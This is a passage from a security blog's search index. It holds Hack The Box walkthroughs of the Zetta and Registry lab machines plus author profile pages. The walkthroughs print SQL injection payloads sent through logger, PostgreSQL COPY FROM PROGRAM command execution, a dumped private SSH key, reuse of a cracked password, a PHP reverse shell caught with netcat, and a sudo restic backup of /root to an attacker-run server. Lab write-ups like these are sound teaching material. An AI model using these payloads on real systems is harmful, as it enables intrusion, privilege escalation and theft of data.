\u003ctitle\u003ePrototype/test DB push of syslog events\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eTesting\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eRework syslog configuration to push all events to the DB\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e \u003c/todo\u003e \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eFind/write GUI for syslog-db access/view\u003c/title\u003e \u003ctext\u003e ........ From above todo list I had to check postgresql log for errors, Hence it confirmed me to exploit log. After a lot of enumeration I found something fishy in /etc/rsyslog.d/.git where I found pgsql.conf but I wasn’t able to cat that file due to permission error. So I used other ways to read that file. For that I used git command since, there is .git repo in that directory as roy@zetta:/tmp$ cd /etc/rsyslog.d/ roy@zetta:/etc/rsyslog.d$ git clone /etc/rsyslog.d/.git /tmp/.git Cloning into '/tmp/.git'... done. roy@zetta:/etc/rsyslog.d$ ls -al /tmp/.git/ total 16 drwxr-xr-x 3 roy roy 4096 Feb 20 06:21 . drwxrwxrwt 11 root root 4096 Feb 20 06:21 .. drwxr-xr-x 8 roy roy 4096 Feb 20 06:21 .git -rw-r--r-- 1 roy roy 807 Feb 20 06:21 pgsql.conf Now I was able to cat that file and where the file indicates there is sql injection one of the template and gives more information about local logging. Logging was new for me so googled and collected information about it. If you have known about logging then you can escape this blog but if you are unknown about logging in syslog then you can click here. roy@zetta:/tmp/.git$ cat pgsql.conf ### Configuration file for rsyslog-pgsql ### Changes are preserved # https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html # Used default template from documentation/source but adapted table # name to syslog_lines so the Ruby on Rails application Maurice is # coding can use this as SyslogLine object. # template(name=\"sql-syslog\" type=\"list\" option.sql=\"on\") { constant(value=\"INSERT INTO syslog_lines (message, devicereportedtime) values ('\") property(name=\"msg\") constant(value=\"','\") property(name=\"timereported\" dateformat=\"pgsql\" date.inUTC=\"on\") constant(value=\"')\") } # load module module(load=\"ompgsql\") #Only forward local7.info for testing. local7.info action(type=\"ompgsql\" server=\"localhost\" user=\"postgres\" pass=\"test1234\" db=\"syslog\" template=\"sql-syslog\") Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as roy@zetta:/tmp/.git$ psql -d syslog psql: FATAL: role \"roy\" does not exist where -d, –dbname=DBNAME database name to connect to (default: “roy”) So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was ","date":"2020-02-22","objectID":"/zetta/:4:1","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Logger -\u003e Sql -\u003e Superuser roy roy@zetta:~$ logger -p local7.info \"aaa',current_timestamp);CREATE USER roy; --\" roy@zetta:~$ psql -d syslog psql (11.4 (Debian 11.4-1)) Type \"help\" for help. syslog=\u003e After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got COPY FROM PROGRAM Command Execution vulnerability. For more info about it you can click here. And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog here. On reading blogs to use COPY command user must be superuser only then I can exploit it. For that I changed the user roy to superuser as roy@zetta:~$ logger -p local7.info \"aaa',current_timestamp);ALTER USER roy WITH SUPERUSER; --\" Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used ($$)Dollar-quoting for escaping single quotes in postgres to exploit command injection. ","date":"2020-02-22","objectID":"/zetta/:5:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Command Injection -\u003e Postgres shell syslog=# CREATE TABLE RCE(RCE text); CREATE TABLE syslog=# COPY RCE FROM PROGRAM $$id$$; COPY 1 syslog=# SELECT * FROM RCE; rce ------------------------------------------------------------------------ postgres uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert) (2 rows) Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the id_rsa key of postgres in directory /var/lib/postgres/.ssh/ So for that I used that cat command in command injection and able to cat the RSA key. syslog=# COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$; COPY 6 syslog=# SELECT * FROM RCE; rce ------------------------------------------------------------------------------ postgres uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert) /var/lib/postgresql/11/main total 20 drwxr-xr-x 4 postgres postgres 4096 Jul 27 2019 . drwxr-xr-x 27 root root 4096 Aug 27 05:39 .. drwxr-xr-x 3 postgres postgres 4096 Jul 27 2019 11 lrwxrwxrwx 1 root root 9 Jul 27 2019 .bash_history -\u003e /dev/null -rw------- 1 postgres postgres 744 Jul 27 2019 .psql_history drwx------ 2 postgres postgres 4096 Jul 27 2019 .ssh total 20 drwx------ 2 postgres postgres 4096 Jul 27 2019 . drwxr-xr-x 4 postgres postgres 4096 Jul 27 2019 .. -rw------- 1 postgres postgres 747 Jul 27 2019 authorized_keys -rw------- 1 postgres postgres 3389 Jul 27 2019 id_rsa -rw-r--r-- 1 postgres postgres 747 Jul 27 2019 id_rsa.pub -----BEGIN OPENSSH PRIVATE KEY----- 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 8h7HZk5","date":"2020-02-22","objectID":"/zetta/:6:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hackthebox"],"content":"Postgres -\u003e Root Now I got the shell of user postgres and searched its home directory and got .psql_history. postgres@zetta:~$ cat .psql_history CREATE DATABASE syslog; \\c syslog CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL); \\d syslog_lines ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres'; and I have todo list from shell of roy .tudu.xml and got this. \u003ctodo done=\"no\" collapse=\"no\"\u003e \u003ctitle\u003eChange shared password scheme from \u0026lt;secret\u0026gt;@userid to something more secure.\u003c/title\u003e \u003ctext\u003e \u003c/text\u003e From above two notes: format of password of user posgres and todo list I made conclusion as password root should be sup3rs3cur3p4ass@root. Finally that worked and got the root shell and root.txt. postgres@zetta:~$ su root Password: root@zetta:/var/lib/postgresql# cd root@zetta:~# whoami root root@zetta:~# id uid=0(root) gid=0(root) groups=0(root) root@zetta:~# cat root.txt b9407e837fb**************** This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box jkr for such an awesome box. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can follow and see my blog in my medium profile: gr4n173. ","date":"2020-02-22","objectID":"/zetta/:7:0","tags":["linux","htb","ftp","postgres","rsync","ipv6","sqli","rce"],"title":"Zetta","uri":"/zetta/"},{"categories":["hello-world"],"content":"This article explains and gives a brief introduction about me","date":"2019-04-16","objectID":"/welcomeblog/","tags":["welcome introduction"],"title":"Welcome to my blog","uri":"/welcomeblog/"},{"categories":["hello-world"],"content":"Profile is Loading……….. ","date":"2019-04-16","objectID":"/welcomeblog/:1:0","tags":["welcome introduction"],"title":"Welcome to my blog","uri":"/welcomeblog/"},{"categories":["moee"],"content":"This is my first vulnerable box ","date":"2020-11-22","objectID":"/moee-1/","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"Details about the first part of Moee Series. ","date":"2020-11-22","objectID":"/moee-1/:0:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"1 Download link You can download here: Moee-1. ","date":"2020-11-22","objectID":"/moee-1/:1:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"2 Details about Box You can visit this link from vulnhub to get the detail information about this box here. Below is the published tweet about it. Hello folks, Finally my box is published on @VulnHub and thanks vulnhub for making this public. You can check this out. Feedback is really appricated. At last but not least I would like to give a huge shout out to @DCAU7 for helping me this out. https://t.co/Ie69rVmhXz — gr4n173 (@gr4n173) December 2, 2020 ","date":"2020-11-22","objectID":"/moee-1/:2:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Registry box from Hack The Box.","date":"2020-04-04","objectID":"/registery/","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Registry box was the hard box. It falls under linux and hard category.Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. ","date":"2020-04-04","objectID":"/registery/:0:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"HTB:Registry Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the id_rsa key and password. For root, I got the www-data shell by exploiting CSRF TO RCE then with that shell I downloaded the backups files with restic-service and got a root.txt. I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-04-04","objectID":"/registery/:1:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Box Details Details of Registry BoxDetails of Registry Box \" Details of Registry Box In the above picture it’s IP was 10.10.10.159 and added it to /etc/hosts as registry.htb. Let’s solve this box. ","date":"2020-04-04","objectID":"/registery/:2:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and which shows port SSH(22), HTTP(TCP 80) and SSL(TCP 443). root@gr4n173:~$ nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 # Nmap 7.80 scan initiated Thu Oct 24 22:03:45 2019 as: nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 Nmap scan report for 10.10.10.159 Host is up (0.30s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 24 22:04:44 2019 -- 1 IP address (1 host up) scanned in 58.92 seconds ","date":"2020-04-04","objectID":"/registery/:3:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration registry.htb As soon as I saw port 80 opened I visited the site and got below as output. Now as usual for website I we usually searched for dir so I searched dirsearch tool as . root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt _|. _ _ _ _ _ _|_ v0.3.8 (_||| _) (/_(_|| (_| ) Extensions: html, txt, php, pcap, tar, bzip | Threads: 10 | Wordlist size: 62279 Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log Target: http://registry.htb/ [20:42:51] Starting: [20:42:54] 301 - 194B - /install -\u003e http://registry.htb/install/ [20:46:22] 200 - 612B - /bolt Task Completed and got the dir /bolt and /install. Fig: /bolt Fig: /install ","date":"2020-04-04","objectID":"/registery/:4:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Subdomain Enumeration As the given was http but looked over https too. In order to find the interesting things I usually use nikto tool. So I used it here too and got the subdomain as docker.registry.htb root@gr4n173:~$ nikto -h https://10.10.10.159 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.159 + Target Hostname: 10.10.10.159 + Target Port: 443 --------------------------------------------------------------------------- + SSL Info: Subject: /CN=docker.registry.htb Ciphers: ECDHE-RSA-AES256-GCM-SHA384 Issuer: /CN=Registry + Start Time: 2020-04-02 21:44:11 (GMT5.75) --------------------------------------------------------------------------- + Server: nginx/1.14.0 (Ubuntu) + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The site uses SSL and Expect-CT header is not present. + No CGI Directories found (use '-C all' to force check all possible dirs) + Hostname '10.10.10.159' does not match certificate's names: docker.registry.htb + The Content-Encoding header is set to \"deflate\" this may mean that the server is vulnerable to the BREACH attack. + OSVDB-3092: /install/: This might be interesting... + 7876 requests: 8 error(s) and 5 item(s) reported on remote host + End Time: 2020-04-03 00:49:25 (GMT5.75) (11114 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ","date":"2020-04-04","objectID":"/registery/:4:1","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Docker Registry Exploit Then I found the dir with dirsearch as http://docker.registry.htb/v2/ and able to login with creds admin:admin. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it here. Then I used this blog to exploit the docker registry and downloaded the file as root@gr4n173:~$ curl --user \"admin:admin\" http://docker.registry.htb/v2/bolt-image/manifests/latest [80/311] { \"schemaVersion\": 1, \"name\": \"bolt-image\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b\" }, { \"blobSum\": \"sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee\" }, { \"blobSum\": \"sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c\" }, { \"blobSum\": \"sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7\" }, { \"blobSum\": \"sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0\" }, { \"blobSum\": \"sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a\" }, { \"blobSum\": \"sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797\" }, { \"blobSum\": \"sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff\" } From above I saw the files name which start with sha256 and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file 01-ssh.ssh sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b and got this as output. #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \"Enter passphrase for /root/.ssh/id_rsa:\" send \"GkOcz221Ftb3ugog\\n\"; expect \"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\" interact this way I got the passphraase and id_rsa and able to ssh in as bolt. root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb The authenticity of host 'registry.htb (10.10.10.159)' can't be established. ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'registry.htb' (ECDSA) to the list of known hosts. Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Fri Apr 3 07:54:40 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 6.1% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 49% IP address for docker0: 172.17.0.1 Swap usage: 0% IP address for br-1bad9bd75d17: 172.18.0.1 Processes: 157 Last login: Fri Apr 3 06:36:39 2020 from 10.10.14.18 bolt@bolt:~$ whoami bolt bolt@bolt:~$ cat user.txt ytc0yt*************** This way I got the user bolt. ","date":"2020-04-04","objectID":"/registery/:4:2","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"To Root ","date":"2020-04-04","objectID":"/registery/:5:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration After a lot of dir search with different wordlist I finally got the login page of bolt cms site as. Fig: Login Page then I searched everypart of the bolt shell and got the hash in dir /var/www/html/app/database/bolt.db and on cat I got the hash $2y$10$e.ChUytg9SrL7AsboF2bX .wWKQ1LkS5Fi/Z0yYD86.P5E9cpY7P. Now I used john to crack the hash and got the password strawberry. root@gr4n173:~$ john hash -wordlist=/usr/share/wordlists/rockyou.txt [sudo] password for bikram: Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status strawberry (?) 1g 0:00:00:05 DONE (2020-04-03 14:02) 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna Use the \"--show\" option to display all of the cracked passwords reliably Session completed I used that creds(admin:strawerry) and logged in bolt cms. Fig: Admin User ","date":"2020-04-04","objectID":"/registery/:5:1","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Unprivileged User After logged in, I searched every part of cms and found the file upload field where I was unable to upload the php file. Since I was admin edited and added php extension in file config.yml which was located at url http://registry.htb/bolt/bolt/file/edit/config/config.yml with a php-reverse-shell.php and listener on. I found one interesting blog CSRF-TO-RCE you can read it. Fig: Uploaded File Listner on: root@gr4n173:~$ nc -lvnp 8888 listneing on [any] 8888 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58100 Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0 can't access tty;job contorl turned off $ $python -c \"import pty;pty.spawn('/bin/bash')\" www-data@bolt:$sudo -l Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest* As, I saw the restic server running as root then searched for files and got backup.php www-data@bolt:/var/www/html$ cat backup.php \u003c?php shell_exec(\"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt\"); Restic Server Then I searched about restic server and collected knowledge you can find here and at first I download to my localhost then started the restic server as you can find file rest-server. root@gr4n173:~$ rest-server --path . --no-auth Data directory: . Authentication disabled Private repositories disabled Starting server on:8000 Creating repository directories in . Creating repository directories in . Now before directly using the rest-server in machine I used and in my local machine and it worked. root@gr4n173:~$ restic -r http://10.10.14.129:8000 init enter password for new repository: enter password again: created restic repository 39fcbee204 at rest:http://10.10.14.129:8000 Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost. Port Forwarding After, it worked in my local machine I port forward from 8000 to 1234 ( this willn’t work if your python is active at 8000 then it will route to another port ). root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Nov 11 14:1018 UTC 2019 System Load: 0.02 Users logged in: 1 Usage of /: 6.5% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 53% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 1% IP address of docker0: 172.17.0.1 Processes: 206 =\u003e There is 1 zombies process. Last Login: Mon Nov 11 14:1018 2019 from 10.10.15.129 bolt@bolt:~$whoami bolt At first I used the full directory of restic server but that doesn’t work so I used below command in www-data shell ","date":"2020-04-04","objectID":"/registery/:5:2","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Rest-Server Backup Files www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ enter password for repository: something password is correct found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan [/root] scanned 18 directories, 19 files in 0:00 [0:03] 100.00% 39.690 KiB / 39.690 KiB 37 /37 items 0 errors ETA 0:00 duration: 0:03 snapshot 4bf1b3af saved Finally I restored and checked the restic server directory and got the files as root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 enter password for repository: repository 39fcbee2 opened succesfully, password is correct created new cache in /root/.cache/restic restorying \u003cSnapshot 4bf1b3af of [/root] at 2019-11-11 14:13:38.38.895820081 +0000 UTC \u003e root@bolt to . Then I checked back to the folder snapshot and got the root.txt root@gr4n173:~/snapshots$ ls 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 root root@gr4n173:~/snapshots$ cd root root@gr4n173:~/snapshots/root$ ls config.yml cron.sh root.txt root@gr4n173:~/snapshots/root$ cat root.txt ntrkz********************* This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box thek for such an awesome box. Especially downloading the backup files from restic server was new one. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-04-04","objectID":"/registery/:5:3","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":null,"content":"Hi! I’m gr4n173 an Security Enthusiast and a python programmer from beautiful country Nepal. I m a nature admire who love to travel and enjoy the beauty of nature. As by profession I m an Electircal Engineer but I love everything in between Internet and Security related suff. ","date":"2020-01-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]